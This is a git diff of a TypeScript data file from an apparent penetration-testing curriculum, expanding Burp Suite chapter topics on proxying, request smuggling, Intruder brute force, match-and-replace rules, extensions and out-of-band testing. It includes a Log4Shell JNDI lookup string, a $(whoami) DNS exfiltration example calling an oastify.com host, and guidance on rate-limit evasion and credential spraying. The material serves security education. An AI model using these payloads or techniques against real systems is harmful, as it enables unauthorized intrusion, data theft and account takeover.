@@ -60,10 +60,11 @@ export const chapter5: RoadmapChapter = {
         }
       ],
       keyTopics: [
-        "Configuring HTTP/HTTPS proxy listeners and browser proxy settings",
-        "Generating, exporting, and trusting the PortSwigger CA root certificate",
-        "Target scope management and filtering noise from HTTP proxy history",
-        "Configuring upstream proxies and SOCKS5 tunnels inside Burp Suite",
+        "The Man-in-the-Middle (MITM) Proxy Architecture: Burp Suite Proxy operates as an intermediate HTTP/HTTPS proxy listening by default on 127.0.0.1:8080. When a browser initiates an HTTPS connection, Burp intercepts the TLS handshake, dynamically generates an on-the-fly SSL certificate signed by its own internal Certificate Authority (PortSwigger CA), and establishes a separate upstream TLS session with the target web server. This allows researchers to view and modify encrypted HTTPS traffic in cleartext.",
+        "PortSwigger CA Installation & Trust Store Integration: Because Burp's internal Certificate Authority is not included in standard operating system trust stores, browsers display severe security warnings (NET::ERR_CERT_AUTHORITY_INVALID) when intercepting traffic. To resolve this, researchers download Burp's root certificate (cacert.der) from http://burp and import it directly into their operating system and browser Authorities trust store. Once trusted, all intercepted HTTPS traffic loads seamlessly without warnings.",
+        "Target Scope Management & Noise Reduction Rules: Enterprise web testing generates immense amounts of traffic from background operating system services, browser extensions, and third-party advertising analytics. In Burp Suite's Target Scope tab, researchers enable advanced scope control using regular expressions to include only authorized domains (e.g. .*\\.target\\.com). Configuring the Proxy HTTP History filter to 'Show only in-scope items' eliminates background noise and focuses analysis on target routes.",
+        "Invisible Proxying & Non-Proxy-Aware Application Interception: Standard web proxies rely on clients explicitly sending HTTP CONNECT requests to establish upstream tunnels. Thick-client applications, mobile apps, and command-line utilities often ignore system proxy settings and send raw TCP packets directly to the destination IP. Enabling 'Invisible Proxying' in Burp allows it to emulate a direct endpoint server, extracting the destination hostname from incoming HTTP Host headers to forward traffic.",
+        "Upstream Proxy Chaining & SOCKS5 Routing: In enterprise corporate environments, outbound internet access requires routing through corporate authenticating proxy gateways. Burp Suite's Upstream Proxy settings allow chaining Burp's outbound connections through an external proxy server. Additionally, configuring Burp to route through an SSH SOCKS5 proxy (127.0.0.1:9050) allows researchers to use Burp's visual GUI to test internal corporate portals accessible only through a remote SSH pivot host.",
       ],
       terminalCommands: [
         "curl -x 127.0.0.1:8080 http://burp/cert -o cacert.der",
@@ -127,10 +128,11 @@ Host: target.com`
         }
       ],
       keyTopics: [
-        "Sending, organizing, and grouping tabs in Burp Repeater",
-        "Disabling automatic `Content-Length` calculation to send malformed packets",
-        "HTTP/2 cleartext and TLS frame inspection vs HTTP/1.1 downgrade",
-        "CL.TE and TE.CL HTTP Request Smuggling desynchronization theory",
+        "Surgical Request Tampering in Burp Repeater: Burp Repeater is the primary manual testing workshop for security researchers, providing byte-level control over raw HTTP requests. Unlike web browsers that automatically sanitize and rewrite malformed headers, Repeater transmits exactly the raw characters specified by the user. Pressing 'Ctrl+R' sends requests from Proxy history to Repeater, and 'Ctrl+Space' dispatches the modified request, allowing rapid experimentation with parameter tampering.",
+        "Content-Length Management & Byte Count Manipulation: By default, Burp Repeater automatically calculates and updates the 'Content-Length' header to match the exact byte size of the request body. When testing for buffer overflows, HTTP Request Smuggling, or backend parser anomalies, unchecking 'Update Content-Length' allows sending malformed byte counts. If Content-Length is shorter than the actual body, the backend server leaves the trailing bytes buffered on the socket.",
+        "HTTP/2 Cleartext & Protocol Downgrade Vulnerabilities: Modern frontend CDNs (Cloudflare, Akamai) communicate with clients over binary HTTP/2 frames, but frequently downgrade traffic to HTTP/1.1 when forwarding requests to backend origin servers. This protocol downgrade introduces severe security discrepancies in how header lengths and chunked encodings are interpreted. Repeater allows toggling between HTTP/1.1 and HTTP/2 protocols to identify desynchronization flaws between tiers.",
+        "HTTP Request Smuggling (CL.TE & TE.CL) Desync Theory: HTTP Request Smuggling occurs when frontend reverse proxies and backend servers disagree on how to determine the boundaries of an HTTP request. In a CL.TE desynchronization, the frontend uses the Content-Length header while the backend uses Transfer-Encoding: chunked. An attacker crafts a request with both headers, causing the backend to process only the first chunk and leaving the remaining payload buffered in the shared TCP connection.",
+        "Connection Pool Poisoning & Cross-User Request Hijacking: When an HTTP Request Smuggling payload is successfully buffered on a persistent backend TCP socket, it prepends itself to the NEXT request transmitted on that shared connection. When an innocent victim submits an HTTP request to the website seconds later, their request is appended directly to the attacker's smuggled payload. This allows the attacker to steal the victim's session cookies, redirect their traffic, or execute unauthorized actions.",
       ],
       terminalCommands: [
         "# Testing HTTP/2 support via cURL:",
@@ -201,10 +203,11 @@ Host: target.com`
         }
       ],
       keyTopics: [
-        "Sniper, Battering Ram, Pitchfork, and Cluster Bomb attack configurations",
-        "Payload types: Simple list, Numbers, Brute forcer, Null payloads, Character blocks",
-        "Grep - Match and Grep - Extract for automated token parsing",
-        "Bypassing application rate limits using spoofed IP headers",
+        "Burp Intruder Attack Modes (Sniper, Battering Ram, Pitchfork, Cluster Bomb): Sniper cycles through each marked payload position sequentially using a single dictionary, ideal for fuzzing parameters for XSS or SQLi. Battering Ram inserts the exact same word into all marked positions simultaneously. Pitchfork iterates through multiple dictionaries in lockstep parallel (User1:Pass1, User2:Pass2), perfect for credential stuffing lists. Cluster Bomb tests every combinatorial permutation across multiple lists (N x M), ideal for brute-forcing unknown usernames and passwords.",
+        "Payload Processing Rules & Dynamic Encoding: Burp Intruder supports multi-stage payload processing rules that transform dictionary words before transmission. Rules include prefixing/suffixing characters, hashing values (MD5, SHA-256), Base64 encoding, and URL encoding. Configuring payload processing rules allows testing complex authentication schemes (like Basic Auth where usernames and passwords must be concatenated and Base64-encoded as 'user:pass').",
+        "Grep - Match & Grep - Extract for Automated Token Parsing: The 'Grep - Match' feature flags responses containing specific success or failure strings (such as 'Invalid password' or 'Welcome Admin'), creating sortable columns in the results table. The 'Grep - Extract' feature uses regex or visual selection to automatically parse dynamic anti-CSRF tokens from an HTTP response, feeding them dynamically into the subsequent Intruder request to bypass CSRF token validation during brute-force attacks.",
+        "WAF Rate Limit Evasion via Header Spoofing: Application rate limiters and Web Application Firewalls frequently track client request velocity using client-supplied HTTP headers rather than the physical TCP socket IP address. Injecting randomized IP addresses into headers like 'X-Forwarded-For: \u00a7IP\u00a7', 'X-Real-IP', or 'Client-IP' across Intruder requests resets the rate-limiting counter on each attempt. This allows high-velocity brute-force attacks to continue without triggering temporary IP bans.",
+        "Credential Spraying Methodology: Traditional brute-force attacks test thousands of passwords against a single target user account, which inevitably triggers account lockout policies after 3 to 5 failed attempts. Credential Spraying flips this paradigm by testing a single common password (e.g. 'Winter2025!') against thousands of different corporate usernames. This remains below individual account lockout thresholds while virtually guaranteeing access to multiple accounts across large organizations.",
       ],
       terminalCommands: [
         "# Verify rate limiting behavior using cURL loop:",
@@ -275,10 +278,11 @@ Host: target.com`
         }
       ],
       keyTopics: [
-        "Creating custom Match and Replace rules in Proxy Settings",
-        "Automating header injection (X-Forwarded-For, Custom API tokens)",
-        "Stripping CSP and X-Frame-Options headers from responses",
-        "Automated authorization testing via session token replacement",
+        "Proxy Match and Replace Rules Architecture: Match and Replace rules (located in Proxy > Settings) execute automated, regex-based string replacements on all HTTP requests and responses passing through Burp Proxy. Rules execute silently in the background before requests hit the network wire or before responses are rendered in the browser. This allows penetration testers to automate repetitive testing modifications across their entire browsing session.",
+        "Automated Header Injection (X-Forwarded-For, Role Spoofing): Researchers configure Match and Replace rules to automatically inject custom headers into every outgoing request. Adding 'X-Forwarded-For: 127.0.0.1' tests for IP-based administrative whitelisting bypasses across all visited endpoints. Adding 'X-Debug-Mode: 1' or custom internal API tokens allows auditing how backend services react to elevated internal operational flags without manual Repeater intervention.",
+        "Stripping Browser Security Headers (CSP, X-Frame-Options): Testing for Client-Side vulnerabilities like DOM XSS and Clickjacking in a real browser is frequently blocked by modern security headers. A Match and Replace rule can automatically strip 'Content-Security-Policy', 'X-Frame-Options', and 'Strict-Transport-Security' from incoming HTTP response headers. This allows researchers to quickly verify whether an XSS or framing payload executes in the DOM without browser security interference.",
+        "Automated Authorization Testing via Cookie Swapping: A classic authorization testing workflow involves configuring a Match and Replace rule that replaces User A's session cookie with User B's session cookie. The researcher then browses the application as User A. If any pages load private data or execute state-changing actions successfully, an immediate Insecure Direct Object Reference (IDOR) or Broken Object Level Authorization (BOLA) vulnerability is verified.",
+        "Unhiding Hidden Form Fields & Disabling Client Validations: Match and Replace rules can modify response HTML bodies before they reach the browser engine. Replacing 'type=\"hidden\"' with 'type=\"text\"' makes all hidden form fields visible and editable directly in the webpage. Replacing 'disabled' or 'maxlength=\"[0-9]+\"' with empty strings bypasses client-side HTML5 form restrictions, allowing researchers to submit arbitrary inputs directly through standard browser UI forms.",
       ],
       terminalCommands: [
         "# Verify injected headers using local Netcat listener:",
@@ -350,10 +354,11 @@ def handleResponse(req, interesting):
         }
       ],
       keyTopics: [
-        "Automated access control and IDOR auditing with Autorize",
-        "Writing custom Python scripts for Turbo Intruder",
-        "Executing the single-packet attack to exploit database race conditions",
-        "Querying full HTTP traffic history with Logger++ regular expressions",
+        "Autorize: Automated Authorization & IDOR Auditing: Autorize is an industry-standard Burp extension that automates the detection of Broken Access Control and IDOR vulnerabilities. The researcher configures Autorize with a low-privilege user session cookie, then browses the web application as a high-privilege Administrator. For every request the browser makes, Autorize replays the request in the background using the low-privilege cookie and a third time with zero cookies, comparing response lengths to detect bypasses.",
+        "Turbo Intruder: High-Speed Race Condition Exploitation: Written by PortSwigger Research, Turbo Intruder utilizes a custom, hyper-optimized HTTP stack written in C (kl-http) coupled with a Python scripting engine. Capable of transmitting over 2,000 requests per second, Turbo Intruder can execute the 'single-packet attack': preparing dozens of identical requests and releasing their final bytes simultaneously within a single TCP packet. This forces databases to process transactions in exact parallel, exploiting race conditions in financial checkouts and coupon redemptions.",
+        "Logger++: Multi-Tab SQL-Like Traffic Querying: The default Burp Suite HTTP history log lacks advanced filtering capabilities for multi-threaded extension traffic. Logger++ records every single request and response generated by Burp Proxy, Scanner, Intruder, and all installed extensions into a unified, high-performance database. Researchers use SQL-like filter queries and regular expressions to search for specific headers, response lengths, and error patterns across historical session logs.",
+        "JSON Web Tokens (JWT) Extension Tools: The JWT Editor extension integrates cryptographic manipulation tools directly into Burp Suite. It automatically decodes JWTs in passing traffic, highlights algorithm fields, and provides one-click attacks for testing the 'none' algorithm bypass. The extension also manages local RSA/HMAC key stores, allowing researchers to execute RS256-to-HS256 key confusion attacks and resign tampered tokens effortlessly.",
+        "Software Vulnerability Discovery with Software Vulnerability Scanner: This extension passively inspects HTTP response headers, script paths, and error traces to identify running software versions (e.g. Apache, PHP, jQuery, WordPress plugins). It automatically cross-references detected versions against the Vulners database, flagging outdated components that have public CVE exploits. This automates component-level vulnerability analysis during initial passive application mapping.",
       ],
       terminalCommands: [
         "# Verifying Turbo Intruder installation requirements:",
@@ -424,10 +429,11 @@ Result: The username 'root' is successfully exfiltrated via DNS!`
         }
       ],
       keyTopics: [
-        "Out-of-Band Application Security Testing (OAST) theory and architecture",
-        "Injecting Collaborator payloads to detect Blind SSRF, Blind XXE, and Log4j",
-        "Exfiltrating data through DNS tunneling over UDP port 53",
-        "Configuring custom private Collaborator instances on enterprise engagements",
+        "Out-of-Band Application Security Testing (OAST) Paradigm: Traditional web testing relies on immediate feedback: an attacker injects a payload and inspects the HTTP response for errors or reflected data. However, modern asynchronous architectures process inputs in background worker queues or send requests to internal services that never reflect in the HTTP response. OAST overcomes this limitation by using payloads that coerce the target server to initiate an external network connection back to a controlled listener.",
+        "Burp Collaborator Architecture & Listener Daemons: Burp Collaborator is an independent server component running custom DNS, HTTP, HTTPS, and SMTP listener daemons. When Burp Suite tests a target, it generates unique, cryptographically random subdomains (e.g. xyz123.oastify.com) and injects them into application inputs. The target server resolves the domain or initiates an HTTP connection, which the Collaborator server logs with timestamps and originating IP addresses.",
+        "Detecting Blind Vulnerabilities (SSRF, XXE, SQLi, Log4j): When testing for Blind Server-Side Request Forgery (SSRF) or Blind XML External Entity (XXE) injection, inserting a Collaborator URL into input fields triggers an immediate out-of-band DNS query from the target's internal network. Similarly, critical vulnerabilities like Log4Shell (CVE-2021-44228) are confirmed by injecting JNDI lookup strings (${jndi:ldap://xyz.oastify.com/a}), which force the vulnerable Java server to query the Collaborator listener.",
+        "DNS Exfiltration across Firewalled Egress Networks: In highly hardened enterprise environments, strict egress firewall rules block all outbound HTTP and HTTPS connections (ports 80 and 443) from internal application servers to the public Internet. However, network firewalls almost always permit outbound UDP port 53 (DNS) so internal servers can resolve hostnames. Attackers exfiltrate sensitive data (passwords, AWS keys) by prepending data as DNS subdomains (e.g. $(whoami).xyz.oastify.com).",
+        "Deploying Private Collaborator Servers for Enterprise Compliance: In high-security client penetration tests, sending customer data or internal corporate hostnames to public third-party servers like oastify.com violates non-disclosure agreements and data privacy regulations. Organizations deploy their own private Burp Collaborator instances on an AWS EC2 or dedicated server with custom authoritative DNS nameservers. This ensures all out-of-band telemetry remains strictly confidential and compliant.",
       ],
       terminalCommands: [
         "# Test DNS resolution to Collaborator payload:",
